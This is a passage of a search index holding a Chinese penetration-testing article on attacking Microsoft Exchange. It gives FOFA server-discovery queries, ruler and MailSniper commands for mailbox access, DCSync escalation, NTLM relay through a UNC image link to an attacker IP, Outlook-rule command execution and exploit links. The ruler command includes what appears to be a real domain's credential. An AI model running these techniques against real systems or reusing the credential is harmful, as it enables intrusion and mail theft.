\u65ad\u5f00PSSession\uff1a Remove-PSSession \\$Session \u6d4b\u8bd5\u547d\u4ee4(\u83b7\u5f97\u6240\u6709\u90ae\u7bb1\u7528\u6237): Get-Mailbox ruler\u5bfc .\\ruler-win64.exe -e idm@chinaexpressair.com -p Sys@123456 --url https://autodiscover.chinaexpressair.com/autodiscover/autodiscover.xml abk list \u67e5\u627e\u5b58\u5728\u7f3a\u9677\u7684\u7528\u6237\u90ae\u7bb1\u6743\u9650\u59d4\u6d3e \u4e00\u4e2a\u7528\u6237\u7684\u6587\u4ef6\u5939\u662f\u53ef\u4ee5\u7ed9\u5176\u4ed6\u7528\u6237\u6743\u9650\u7684\u3002 \u70b9\u51fb\u6b64\u5904\u7684\u6743\u9650\uff0c\u6765\u5230\u4ee5\u4e0b\u754c\u9762\uff0c\u8fd9\u91cc\u7684\u9ed8\u8ba4\u5373 \u6240\u6709\u7528\u6237(everyone) \u7684\u5bf9\u6b64\u6587\u4ef6\u5939\u7684\u6743\u9650\uff0c\u6211\u8fd9\u91cc\u662f\u628a\u6743\u9650\u7ed9\u7684\u5f88\u9ad8 \u5b9e\u6218\u4e2d\u4e5f\u53ef\u80fd\u4f1a\u9047\u5230\u7528\u6237A\u5bf9\u7528\u6237B\u7684\u6536\u4ef6\u7bb1\u6709\u8bfb\u5199\u6743\u9650\u7684\u60c5\u51b5\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u83b7\u53d6\u7528\u6237A\u7684\u51ed\u636e\u540e\u53ef\u4ee5\u8fdb\u800c\u8bfb\u53d6\u7528\u6237B\u7684\u6536\u4ef6\u7bb1\u3002 \u7528MailSniper \u5b9e\u73b0 Invoke-OpenInboxFinder -ExchangeVersion Exchange2013_SP1 -ExchHostname ex.const.com -EmailList .\\user.txt -remote \u65e2\u7136\u8fd9\u91cc\u5bf9administrator\u7684\u6536\u4ef6\u7bb1\u53ef\u8bfb\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u7528invoke-selfsearch \u8fdb\u884c\u8be6\u7ec6\u7684\u90ae\u4ef6\u68c0\u7d22\u4e86\u3002 \u901a\u8fc7exchange\u7528\u6237\u7ec4\u8fdb\u884c\u57df\u63d0\u6743 exchange\u5b89\u88c5\u540e\u4f1a\u5728AD\u4e0a\u751f\u6210\u4e24\u4e2a\u5bb9\u5668 \u5176\u4e2dexchange windows permissions\u7ec4\u7684\u7528\u6237\u62e5\u6709writeDACL\u6743\u9650\uff0c Exchange Trusted Subsystem \u662f Exchange Windows Permission \u7684\u6210\u5458\uff0c\u80fd\u7ee7\u627fwritedacl\u6743\u9650\uff0c\u6709\u8fd9\u4e2a\u6743\u9650\u540e\u5c31\u80fd\u4f7f\u7528dcsync\u5bfc\u51fa\u6240\u6709\u7528\u6237hash\u3002 \u5176\u4e2dexchange trusted subsystem\u7ec4\u751a\u81f3\u53ef\u80fd\u6709\u7ee7\u627f\u81eaadministrators\u7ec4\u7684\u6743\u9650\u3002 \u540c\u65f6\uff0c\u5728\u5b89\u88c5exchange\u540e\u8fd8\u4f1a\u751f\u6210\u4e00\u4e2a\u7ec4Organization Management\uff0c\u8fd9\u4e2a\u7ec4\u53ef\u4ee5\u4fee\u6539\u5176\u4ed6exchange\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff0c\u6240\u4ee5\u5f53\u7136\u4e5f\u53ef\u4ee5\u4fee\u6539Exchange Trusted Subsystem\u7ec4\u7684\u6210\u5458\u4fe1\u606f\uff0c\u6bd4\u5982\u5411\u91cc\u9762\u52a0\u4e00\u4e2a\u4ee5\u83b7\u5f97\u7684\u7528\u6237\u3002 \u7efc\u4e0a\u6240\u8ff0\uff0c\u53ea\u8981\u83b7\u5f97Organization Management,Exchange Trusted Subsystem,Exchange Windows Permission,\u5c31\u53ef\u4ee5\u901a\u8fc7dcsync\u6765\u83b7\u53d6\u6574\u4e2a\u57df\u6743\u9650\u3002 \u5f53\u7136\uff0c\u60f3\u83b7\u5f97\u4e0a\u8ff0\u7ec4\u7528\u6237\u6743\u9650\uff0c\u8fd8\u662f\u4e0d\u592a\u5bb9\u6613\u7684\u3002 NTLM relay \u7528exchange\u4e5f\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u8fdb\u884cNTLM relay\uff1a\u7ed9\u7528\u6237\u53d1\u4e00\u5c01\u90ae\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u7684\u56fe\u7247\u94fe\u63a5\u5f62\u5982 \\\\10.10.10.1\\a.jpg\uff0c\u7528\u6237\u6536\u5230\u90ae\u4ef6\u540e\u5219\u4f1a\u541110.10.10.1\u53d1\u9001NTLM\u8d28\u8be2\uff0c\u4ece\u800c\u9020\u6210NTLM relay\u3002 \u5176\u5b9eEXCHANGE \u5f88\u591aCVE \u90fd\u662f\u4e0eNTLM RELAY \u6302\u94a9\u7684\uff0c\u5982 CVE-2018-8581 \uff0c CVE-2020-17141 \uff0c CVE-2020-17143 \uff0c CVE-2019-1040 OUTLOOK \u547d\u4ee4\u6267\u884c OUTLOOK \u5ba2\u6237\u7aef\u6709\u4e00\u4e2a \u89c4\u5219\u4e0e\u901a\u77e5 \u7684\u529f\u80fd\uff0c\u901a\u8fc7\u8be5\u529f\u80fd\u53ef\u4ee5\u4f7foutlook\u5ba2\u6237\u7aef\u5728\u6307\u5b9a\u60c5\u51b5\u4e0b\u6267\u884c\u6307\u5b9a\u7684\u6307\u4ee4\u3002\u82e5\u6211\u4eec\u83b7\u5f97\u67d0\u7528\u6237\u7684\u51ed\u8bc1\uff0c\u53ef\u4ee5\u901a\u8fc7\u6b64\u529f\u80fd\u8bbe\u7f6e\u201c\u7528\u6237\u6536\u5230\u542b\u6307\u5b9a\u5b57\u7b26\u7684\u90ae\u4ef6\u65f6 \u6267\u884c\u6307\u5b9a\u7684\u6307\u4ee4\u6bd4\u5982clac.exe\u201d\uff0c\u5f53\u7528\u6237\u767b\u5f55outlook\u5ba2\u6237\u7aef\u5e76\u8bbf\u95ee\u5230\u6b64\u90ae\u4ef6\u65f6\uff0c\u5b83\u7684\u7535\u8111\u4fbf\u4f1a\u6267\u884ccalc.exe\u3002 \u4f46\u662f\uff0c\u5f53\u89e6\u53d1\u52a8\u4f5c\u4e3a\u542f\u52a8\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u53ea\u80fd\u76f4\u63a5\u8c03\u7528\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u5982\u542f\u52a8\u4e00\u4e2aexe\u7a0b\u5e8f\uff0c\u4f46\u65e0\u6cd5\u4e3a\u5e94\u7528\u7a0b\u5e8f\u4f20\u9012\u53c2\u6570\uff0c\u60f3\u8981\u76f4\u63a5\u4e0a\u7ebf\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06EXE\u653e\u5230\u67d0\u5171\u4eab\u76ee\u5f55\u4e0b\uff0c\u6216\u8005\u76f4\u63a5\u4e0a\u4f20\u5230\u7528\u6237\u7684\u673a\u5668\u3002 \u5177\u4f53\u6b65\u9aa4\u4e3a\u6253\u5f00\u89c4\u5219\u4e0e\u901a\u77e5\u529f\u80fd\uff0c\u7136\u540e\u65b0\u5efa\u529f\u80fd\uff0c\u5728\u63a5\u6536\u5230\u67d0\u6761\u4ef6\u90ae\u4ef6\u65f6\u542f\u52a8\u6307\u5b9a\u5e94\u7528\u7a0b\u5e8f \u6536\u5230\u542babc\u5185\u5bb9\u7684\u90ae\u4ef6\u540e\uff0c\u6210\u529f\u5f39\u8ba1\u7b97\u5668 proxylogon \u547d\u4ee4\u6267\u884c Exchange Server 2019 < 15.02.0792.010 Exchange Server 2019 < 15.02.0721.013 Exchange Server 2016 < 15.01.2106.013 Exchange Server 2013 < 15.00.1497.012 h ttps://github.com/jeningogo/exchange-ssrf-rce/blob/main/exchange-exp.py \u524d\u63d0\u662f\u9700\u8981\u4e00\u4e2aoutlook\u8d26\u6237 CVE-2020-0688 rce Microsoft Exchange Server 2010 Service Pack 3 Microsoft Exchange Server 2013 Microsoft Exchange Server 2016 Microsoft Exchange Server 2019 \u9700\u8981\u4e00\u4e2a\u8d26\u6237 https://github.com/zcgonvh/CVE-2020-0688","title":"\u9488\u5bf9EXCHANGE\u7684\u653b\u51fb\u65b9\u5f0f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#exchange","text":"","title":"\u9488\u5bf9EXCHANGE\u7684\u653b\u51fb\u65b9\u5f0f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_1","text":"exchange\u5feb\u901f\u4e86\u89e3 \u90ae\u4ef6\u670d\u52a1\u5668\u89d2\u8272 exchange 2010 exchange 2013 \u63a5\u53e3\u548c\u534f\u8bae OWA ECP outlook anywhere MAPI EAS EWS \u529f\u80fd\u548c\u670d\u52a1 Autodiscover GAL EXCHANGE\u4fe1\u606f\u641c\u96c6 \u53d1\u73b0 \u7aef\u53e3\u626b\u63cf spn \u7279\u6b8a\u57df\u540d \u5bfb\u627e\u63a5\u53e3 \u5de5\u5177\u4f7f\u7528 \u7248\u672c\u786e\u5b9a IP\u6cc4\u9732 \u6cc4\u9732exchange\u670d\u52a1\u5668\u4fe1\u606f EXCHANGE \u5916\u56f4\u6253\u70b9 proxyshell \u547d\u4ee4\u6267\u884c \u7206\u7834 EXCHANGE \u540e\u6e17\u900f \u90ae\u4ef6\u5185\u5bb9\u68c0\u7d22 \u83b7\u53d6\u5168\u5c40\u5730\u5740\u8868 \u901a\u7528\u65b9\u6848MailSniper \u5728\u57df\u5185\u8fdb\u884c\u5bfc\u51fa ruler\u5bfc \u67e5\u627e\u5b58\u5728\u7f3a\u9677\u7684\u7528\u6237\u90ae\u7bb1\u6743\u9650\u59d4\u6d3e \u901a\u8fc7exchange\u7528\u6237\u7ec4\u8fdb\u884c\u57df\u63d0\u6743 NTLM relay OUTLOOK \u547d\u4ee4\u6267\u884c proxylogon \u547d\u4ee4\u6267\u884c CVE-2020-0688 rce","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#exchange_1","text":"FOFA\uff1a microsoft exchange 2013\uff1a app=\"Microsoft-Exchange-2013\"||app=\"Microsoft-Exchange-Server-2013-CU21\"||app=\"Microsoft-Exchange-Server-2013-CU17\"||app=\"Microsoft-Exchange-Server-2013-CU23\"||app=\"Microsoft-Exchange-Server-2013-CU13\"||app=\"Microsoft-Exchange-Server-2013-CU22\"||app=\"Microsoft-Exchange-Server-2013-CU11\"||app=\"Microsoft-Exchange-Server-2013-CU2\"||app=\"Microsoft-Exchange-Server-2013-CU16\"||app=\"Microsoft-Exchange-Server-2013-CU19\"||app=\"Microsoft-Exchange-Server-2013-CU3\"||app=\"Microsoft-Exchange-Server-2013-CU18\"||app=\"Microsoft-Exchange-Server-2013-CU5\"||app=\"Microsoft-Exchange-Server-2013-CU20\"||app=\"Microsoft-Exchange-Server-2013-CU12\"||app=\"Microsoft-Exchange-Server-2013-CU15\"||app=\"Microsoft-Exchange-Server-2013-CU10\"||app=\"Microsoft-Exchange-Server-2013-CU9\"||app=\"Microsoft-Exchange-Server-2013-CU6\"||app=\"Microsoft-Exchange-Server-2013-CU7\"||app=\"Microsoft-Exchange-Server-2013-CU1\"||app=\"Microsoft-Exchange-Server-2013-CU14\"||app=\"Microsoft-Exchange-Server-2013-CU8\"||app=\"Microsoft-Exchange-Server-2013-RTM\"||app=\"Microsoft-Exchange-Server-2013-SP1\"||app=\"Microsoft-Exchange-2013\" microsoft exchange 2016\uff1a app=\"Microsoft-Exchange-Server-2016-CU19\"||app=\"Microsoft-Exchange-Server-2016-CU3\"||app=\"Microsoft-Exchange-Server-2016-CU12\"||app=\"Microsoft-Exchange-Server-2016-RTM\"||app=\"Microsoft-Exchange-Server-2016-CU7\"||app=\"Microsoft-Exchange-Server-2016-CU17\"||app=\"Microsoft-Exchange-Server-2016-CU2\"||app=\"Microsoft-Exchange-Server-2016-CU1\"||app=\"Microsoft-Exchange-Server-2016-CU14\"||app=\"Microsoft-Exchange-Server-2016-CU5\"||app=\"Microsoft-Exchange-Server-2016-CU11\"||app=\"Microsoft-Exchange-Server-2016-CU9\"||app=\"Microsoft-Exchange-Server-2016-CU16\"||app=\"Microsoft-Exchange-Server-2016-CU10\"||app=\"Microsoft-Exchange-Server-2016-CU6\"||app=\"Microsoft-Exchange-Server-2016-CU13\"||app=\"Microsoft-Exchange-Server-2016-CU18\"||app=\"Microsoft-Exchange-Server-2016-CU8\"||app=\"Microsoft-Exchange-Server-2016-CU4\"||app=\"Microsoft-Exchange-2016-POP3-server\" microsoft exchange 2019\uff1a app=\"Microsoft-Exchange-Server-2019-CU5\"||app=\"Microsoft-Exchange-Server-2019-CU3\"||app=\"Microsoft-Exchange-Server-2019-Preview\"||app=\"Microsoft-Exchange-Server-2019-CU8\"||app=\"Microsoft-Exchange-Server-2019-CU1\"||app=\"Microsoft-Exchange-Server-2019-CU7\"||app=\"Microsoft-Exchange-Server-2019-CU2\"||app=\"Microsoft-Exchange-Server-2019-CU6\"||app=\"Microsoft-Exchange-Server-2019-RTM\"||app=\"Microsoft-Exchange-Server-2019-CU4\" microsoft exchange 2010\uff1a app=\"Microsoft-Exchange-2010-POP3-server-version-03.1\"||app=\"Microsoft-Exchange-Server-2010\"","title":"exchange\u5feb\u901f\u4e86\u89e3"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_2","text":"\u5728exchange 2010\u4e2d\uff0cexchange\u5305\u542b\u4e94\u4e2a\u670d\u52a1\u5668\u89d2\u8272\uff0c\u5206\u522b\u4e3a\u90ae\u7bb1\u670d\u52a1\u5668\uff0c\u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\u5668\uff0c\u96c6\u7ebf\u4f20\u8f93\u670d\u52a1\u5668\uff0c\u7edf\u4e00\u6d88\u606f\u670d\u52a1\u5668\uff0c\u8fb9\u7f18\u4f20\u8f93\u670d\u52a1\u5668\u3002 \u5728\u540e\u6765\u7684exchange 2013\u4e2d\u670d\u52a1\u5668\u88ab\u7cbe\u7b80\u4e3a3\u4e2a\uff1a\u90ae\u7bb1\u670d\u52a1\u5668\uff0c\u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\u5668\uff0c\u8fb9\u7f18\u4f20\u8f93\u670d\u52a1\u5668 exchange 2016\u548c2019\u4e2d\u5219\u53ea\u6709 \u90ae\u7bb1\u670d\u52a1\u5668\u548c\u8fb9\u7f18\u4f20\u8f93\u670d\u52a1\u5668\u4e86\u3002","title":"\u90ae\u4ef6\u670d\u52a1\u5668\u89d2\u8272"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#exchange-2010","text":"\u90ae\u7bb1\u670d\u52a1\u5668 mailbox server\uff0c\u63d0\u4f9b\u6258\u7ba1\u90ae\u7bb1\uff0c\u516c\u5171\u6587\u4ef6\u5939\u7b49\u670d\u52a1\uff0c\u662f\u5fc5\u9009\u7684\u670d\u52a1\u5668\u89d2\u8272 \u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\u5668 client access server\uff0c\u7528\u6765\u63a5\u6536\u5e76\u5904\u7406\u4e0d\u540c\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\uff0c\u5e76\u63d0\u4f9b\u5404\u79cd\u63a5\u53e3\u7ed9\u5ba2\u6237\u4ee5\u8bbf\u95eeExchange\u670d\u52a1, MAPI\u8bbf\u95ee POP3\u548cIMAP4\u8bbf\u95ee Outlook Web App\u8bbf\u95ee\uff08OWA\uff09 Outlook Anywhere\u8bbf\u95ee Autodiscover\u81ea\u52a8\u53d1\u73b0\u670d\u52a1 \u53ef\u7528\u6027\u670d\u52a1 \u96c6\u7ebf\u4f20\u8f93\u670d\u52a1\u5668 hub transport server\uff0c\u6838\u5fc3\u670d\u52a1\u662fMicrosoft Exchange Transport\uff0c\u7528\u4e8e\u5904\u7406\u5927\u591a\u6570\u90ae\u4ef6\u7684\u8def\u7531\u3001\u7b56\u7565\u7b49\u4ee5\u53caMail Flow\u3002\u8d77\u4e00\u4e2a\u90ae\u4ef6\u4f20\u8f93\u4e2d\u7ee7\u7684\u4f5c\u7528\u3002 \u7edf\u4e00\u6d88\u606f\u670d\u52a1\u5668 unified messaging server\uff0c\u7528\u4e8e\u5141\u8bb8\u90ae\u7bb1\u7528\u6237\u53ef\u4ee5\u5728\u90ae\u4ef6\u4e2d\u53d1\u9001\u5b58\u50a8\u8bed\u97f3\u6d88\u606f\u548c\u4f20\u771f\u6d88\u606f\uff0c\u53ef\u9009\u89d2\u8272 \u8fb9\u7f18\u4f20\u8f93\u670d\u52a1\u5668 edge transport server\uff0c\u901a\u5e38\u90e8\u7f72\u4e8e\u7f51\u7edc\u8fb9\u754c\u3002\u5176\u63a5\u53d7\u6765\u81ea\u5185\u90e8\u7ec4\u7ec7\u7684\u90ae\u4ef6\u548c\u6765\u81ea\u5916\u90e8\u53ef\u4fe1\u670d\u52a1\u5668\u7684\u90ae\u4ef6\uff0c\u7136\u540e\u5e94\u7528\u7279\u5b9a\u7684\u53cd\u5783\u573e\u90ae\u4ef6\u3001\u53cd\u75c5\u6bd2\u7b56\u7565\uff0c\u6700\u540e\u5c06\u901a\u8fc7\u7b56\u7565\u7b5b\u9009\u7684\u90ae\u4ef6\u8def\u7531\u5230\u5185\u90e8\u7684\u96c6\u7ebf\u4f20\u8f93\u670d\u52a1\u5668\uff0c\u53ef\u9009\u89d2\u8272","title":"exchange 2010"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#exchange-2013","text":"\u90ae\u7bb1\u670d\u52a1\u5668 \u6258\u7ba1\u90ae\u7bb1\u3001\u516c\u5171\u6587\u4ef6\u5939\u7b49\u6570\u636e\uff0c\u4e3b\u8981\u5305\u542b\u96c6\u7ebf\u4f20\u8f93\u670d\u52a1\uff08Hub Transport service\uff09\u548c\u90ae\u7bb1\u4f20\u8f93\u670d\u52a1\uff08Mailbox Transport service\uff09\u4e24\u5927\u7ec4\u4ef6\u670d\u52a1\u3002 \u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\u5668 \u8d1f\u8d23\u8ba4\u8bc1\u3001\u91cd\u5b9a\u5411\u3001\u4ee3\u7406\u6765\u81ea\u5916\u90e8\u4e0d\u540c\u5ba2\u6237\u7aef\u7684\u8bbf\u95ee\u8bf7\u6c42\uff0c\u4e3b\u8981\u5305\u542b\u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\uff08Client Access service\uff09\u548c\u524d\u7aef\u4f20\u8f93\u670d\u52a1\uff08Front End Transport service\uff09\u4e24\u5927\u7ec4\u4ef6\u3002 \u8fb9\u7f18\u4f20\u8f93\u670d\u52a1\u5668 \u8d1f\u8d23\u8def\u7531\u51fa\u7ad9\u4e0e\u5165\u7ad9\u90ae\u4ef6\u3001\u7b56\u7565\u5e94\u7528\u7b49\u3002","title":"exchange 2013"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_3","text":"","title":"\u63a5\u53e3\u548c\u534f\u8bae"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#owa","text":"owa\u5373 outlook web app,\u5373outlook\u7684\u7f51\u9875\u7248\u3002\uff08outlook\u662fexchange\u7684\u5ba2\u6237\u7aef\u8f6f\u4ef6\uff0c\u8bb8\u591a\u7535\u8111\u90fd\u6709\u6240\u9884\u88c5\uff09 \u5730\u5740\u4e00\u822c\u4e3a http://aa.com/owa","title":"OWA"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#ecp","text":"Exchange Administrative Center,\u5373exchange\u7ba1\u7406\u4e2d\u5fc3\uff0c\u7ba1\u7406\u5458\u7684web\u63a7\u5236\u53f0","title":"ECP"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#outlook-anywhere","text":"\u4f5c\u7528\u662f\u53ef\u4ee5\u8ba9\u5916\u7f51\u7528\u6237\u76f4\u63a5\u901a\u8fc7outlook anywhere \u76f4\u63a5\u767b\u5f55\u5230exchange\u90ae\u7bb1\u800c\u65e0\u9700\u4f7f\u7528VPN\u3002\u8be5\u7279\u6027\u5728exchange server 2013\u4e2d\u9ed8\u8ba4\u5f00\u542f\uff0c\u4e5f\u5c31\u662f\u8bf4\u5728exchange server 2013 \u4ee5\u540eoutlook \u4e0d\u518d\u533a\u5206\u5185\u5916\u7f51\u73af\u5883\u3002","title":"outlook anywhere"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#mapi","text":"\u4e8eExchange 2013 SP1\u548cOutlook 2013 SP1\u4e2d\u88ab\u63d0\u51fa\u7684\u4e00\u79cd\u65b0\u7684outlook\u4e0eexchange\u4ea4\u4e92\u4f20\u8f93\u534f\u8bae\u3002","title":"MAPI"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#eas","text":"Exchange ActiveSync\u662f\u4e00\u79cd\u5141\u8bb8\u7528\u6237\u901a\u8fc7\u79fb\u52a8\u8bbe\u5907\u6216\u5176\u4ed6\u4fbf\u643a\u5f0f\u8bbe\u5907\u8bbf\u95ee\u548c\u7ba1\u7406\u90ae\u4ef6\u3001\u8054\u7cfb\u4eba\u3001\u65e5\u5386\u7b49Exchange\u529f\u80fd\u7684\u540c\u6b65\u534f\u8bae\uff0c\u5728Windows\u4e0a\u4f7f\u7528\u65f6\u5176\u8fdb\u7a0b\u540d\u79f0\u4e3awcesomm.exe\u3002\u201d","title":"EAS"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#ews","text":"Exchange Web Service\uff0c\u662fexchange\u63d0\u4f9b\u7684\u4e00\u5957API\u7f16\u7a0b\u63a5\u53e3\uff0c\u7528\u4e8e\u64cd\u4f5cexchange\u76f8\u5173\u529f\u80fd\uff0c\u4e8eexchange server 2007\u88ab\u63d0\u51fa\u3002","title":"EWS"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_4","text":"","title":"\u529f\u80fd\u548c\u670d\u52a1"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#autodiscover","text":"Autodiscover\uff0c\u81ea\u52a8\u53d1\u73b0\uff0c\u662fexchange server 2007 \u63a8\u51fa\u7684\u4e00\u4e2a\u670d\u52a1\u3002 \u8be5\u670d\u52a1\u76ee\u7684\u662f\u7b80\u5316\u7528\u6237\u767b\u5f55\u6d41\u7a0b\uff1a\u7528\u6237\u53ea\u9700\u8981\u8f93\u5165\u81ea\u5df1\u7684\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u548c\u5bc6\u7801\uff0c\u5c31\u80fd\u591f\u901a\u8fc7Autodiscover\u670d\u52a1\u83b7\u53d6\u8fd0\u884c\u5ba2\u6237\u7aef\u5e94\u7528\u7a0b\u5e8f\u6240\u9700\u7684\u914d\u7f6e\u4fe1\u606f \u8be5\u670d\u52a1\u8fd0\u884c\u5728\u5ba2\u6237\u7aef\u8bbf\u95ee\u670d\u52a1\u5668\u4e0a\u3002","title":"Autodiscover"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#gal","text":"GAL\u5373\u5168\u5c40\u5730\u5740\u8868\uff08global address list\uff09 \u8bb0\u5f55\u4e86\u57df\u4e2d\u7528\u6237\u7684\u57fa\u672c\u4fe1\u606f\u4e0e\u5176\u90ae\u7bb1\u5730\u5740\uff0c\u4ee5\u5f62\u6210\u57df\u7528\u6237\u4e0e\u90ae\u7bb1\u7528\u6237\u4e4b\u95f4\u7684\u5173\u8054\u3002 